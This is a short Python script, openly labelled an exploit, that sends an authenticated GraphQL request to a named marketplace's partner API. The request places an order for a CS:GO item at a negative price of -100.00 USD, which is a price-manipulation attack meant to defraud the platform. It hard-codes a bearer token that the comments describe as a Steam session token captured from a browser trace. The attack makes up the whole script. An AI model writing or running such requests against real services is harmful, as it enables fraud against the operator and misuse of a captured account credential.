import urllib.request
import json

TARGET_URL = "https://api.white.market/graphql/partner"

# Ingesting the authentic Steam authentication token payload captured from your DevTools trace
AUTH_TOKEN = "eyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0.eyAiaXNzIjogInI6MDAwQ18yOEFFODE2NF9GN0E4RCIsICJzdWIiOiAiNzY1NjExOTg2NTM3NzU4NjQiLCAiYXVkIjogWyAid2ViOnN0b3JlIiBdLCAiZXhwIjogMTc4NzM5OTg5OSwgIm5iZiI6IDE3Nzg2NzIyNjIsICJpYXQiOiAxNzg3MzEyMjYyLCAianRpIjogIjAwMENfMjhBRTgxNjRfRjdDOEQiLCAib2F0IjogMTc4NzMxMjI2MCwgInJ0X2V4cCI6IDE3ODk5MTg3NDMsICJwZXIiOiAwLCAiaXBfc3ViamVjdCI6ICIxMjkuMC44NC4zIiwgImlwX2NvbmZpcm1lciI6ICIxMjkuMC44NC4zIiB9.Ckkt1nkjlF4am5WFQfunCEncV2M79sKeS2p45-SnC0KKW93-u3qp77QmsVZ0vQn9yd3GaMfSAxre5JL6L-DDDw"

exploit_payload = {
    "query": """mutation { 
        order_new(
            app: CSGO, 
            quantity: 1,
            nameHash: "AK-47 | Redline (Field-Tested)", 
            price: { value: "-100.00", currency: USD }
        ) { 
            status 
        } 
    }"""
}

data = json.dumps(exploit_payload).encode('utf-8')

req = urllib.request.Request(TARGET_URL, data=data, method="POST")
req.add_header("Content-Type", "application/json")
req.add_header("User-Agent", "Mozilla/5.0")
req.add_header("Authorization", f"Bearer {AUTH_TOKEN}")

print(f"📡 Micro-Repeater: Dispatched authenticated injection vector to {TARGET_URL}...")

try:
    with urllib.request.urlopen(req, timeout=5) as response:
        print(f"\n📥 Live Backend Server Response:")
        print(response.read().decode('utf-8')[:500])
except urllib.error.HTTPError as e:
    print(f"\n📥 Live Backend Server Response:")
    print(e.read().decode('utf-8')[:500])
except Exception as e:
    print(f"\n❌ Network pipeline exception: {e}")
